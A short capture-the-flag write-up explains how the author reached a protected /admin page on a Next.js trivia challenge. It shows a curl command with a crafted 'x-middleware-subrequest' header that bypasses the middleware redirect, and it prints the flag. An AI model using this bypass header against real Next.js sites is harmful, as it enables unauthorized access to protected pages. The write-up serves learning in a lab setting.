# Waterloo Trivia Dash

```
Test your knowledge about Waterloo with this fun trivia game! Complete the quiz to unlock the prize page and claim your reward.
http://challs.watctf.org:3080/ 
```

Visit the website, we find that the source code uses Next.js. After answering all questions, it goes to `/admin`, but immediates redirects back:

```shell
$ curl -v "http://challs.watctf.org:3080/admin"
* Host challs.watctf.org:3080 was resolved.
* IPv6: (none)
* IPv4: 172.174.211.227
*   Trying 172.174.211.227:3080...
* Connected to challs.watctf.org (172.174.211.227) port 3080
* using HTTP/1.x
> GET /admin HTTP/1.1
> Host: challs.watctf.org:3080
> User-Agent: curl/8.14.1
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 307 Temporary Redirect
< location: /
< Date: Tue, 09 Sep 2025 22:11:35 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< Transfer-Encoding: chunked
<
* Connection #0 to host challs.watctf.org left intact
/
```

Recalling a recent challenge [EPIC CAKE BATTLES OF HISTORY!!!](../2025-08-22-brunnerctf2025/epic-cake-battles-of-history.md), there is a vulnerability in Next.js middleware bypass:

```shell
$ curl -v "http://challs.watctf.org:3080/admin?_rsc=1ld0r" -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
```

Flag is shown in the response: `watctf{next_js_middleware_is_cool}`.
